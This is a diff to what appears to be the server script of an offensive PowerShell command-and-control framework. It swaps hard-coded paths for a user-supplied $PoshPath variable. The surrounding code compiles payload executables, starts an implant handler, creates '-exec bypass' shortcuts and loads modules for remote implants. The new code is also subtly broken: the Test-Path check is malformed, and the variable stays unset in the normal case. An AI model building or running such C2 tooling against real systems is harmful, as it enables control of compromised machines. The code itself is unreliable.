@@ -22,6 +22,11 @@ Write-Host "====================================================" `n -Foreground
 if (!(Test-Path -Path C:\temp)) 
 {New-Item c:\Temp -type directory}
 
+if (!Test-Path "C:\Temp\PowershellC2\C2-Server.ps1") {
+    $PoshPath = Read-Host "Cannot find the PowershellC2 directory, please specify path: "
+}
+# if poshpath ends with slash then remove this
+
 # tests for java JDK so we can create a Jar payload and applet
 if (Test-Path "C:\program files\java\") {
     foreach ($folder in (get-childitem -name -path "C:\program files\java\"))
@@ -36,7 +41,7 @@ if (Test-Path "C:\program files\java\") {
 }
 
 $p = $env:PsModulePath
-$p += ";C:\temp\PowershellC2\"
+$p += ";$PoshPath"
 [Environment]::SetEnvironmentVariable("PSModulePath",$p)
 Import-Module -Name PSSQLite
 $global:newdir = $null
@@ -347,10 +352,10 @@ public class Sample : System.Configuration.Install.Installer
 [IO.File]::WriteAllLines("$global:newdir\payloads\posh.cs", $csccode)
 
 if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
-    Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+    Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
 } else {
     if (Test-Path "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe") {
-        Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:C:\Temp\PowershellC2\System.Management.Automation.dll"
+        Start-Process -FilePath "C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe" -ArgumentList "/out:$global:newdir\payloads\posh.exe $global:newdir\payloads\posh.cs /reference:$PoshPath\System.Management.Automation.dll"
     }
 }
 
@@ -764,7 +769,7 @@ if ($args[0])
     write-host ""
 
     #launch a new powershell session with the implant handler running
-    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module C:\Temp\PowershellC2\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
+    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
 
     foreach ($task in $taskscompleted) {
     $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
@@ -1011,11 +1016,11 @@ primer | iex }'
 
     
     #launch a new powershell session with the implant handler running
-    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module C:\Temp\PowershellC2\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
+    Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
     Write-Host `n"To re-open the Implant-Handler or C2Server, use the following shortcuts in this directory: "
     Write-Host "$global:newdir" `n  -ForegroundColor Green
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-exec bypass c:\temp\powershellc2\c2-server.ps1 $global:newdir"
+    $ArgumentsToSourceExe = "-exec bypass $PoshPath\c2-server.ps1 $global:newdir"
     $DestinationPath = "$global:newdir\Restart-C2Server.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -1024,7 +1029,7 @@ primer | iex }'
     $Shortcut.Save()
 
     $SourceExe = "powershell.exe"
-    $ArgumentsToSourceExe = "-exec bypass -NoP -Command import-module C:\Temp\PowershellC2\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
+    $ArgumentsToSourceExe = "-exec bypass -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir'"
     $DestinationPath = "$global:newdir\Restart-Implant-Handler.lnk"
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($DestinationPath)
@@ -1046,7 +1051,7 @@ primer | iex }'
 # add as many images to the images directory as long as the images are less than 1500 bytes in size
 $imageArray = @()
 $imageFilesUsed = @()
-$imageFiles = Get-ChildItem "C:\Temp\PowershellC2\Images" | select FullName
+$imageFiles = Get-ChildItem "$PoshPath\Images" | select FullName
 $count = 0 
 
 while ($count -lt 5) {
@@ -1626,7 +1631,7 @@ $message =[Convert]::ToBase64String($Bytes)
             if ($taskid.ToLower().StartsWith("loadmodule")) 
             {
                 $modulename = $taskid -replace 'LoadModule ', '' 
-                $module = (Get-Content -Path "C:\Temp\PowershellC2\Modules\$modulename") -join "`n"
+                $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
                 # ensure the module name 
 
 
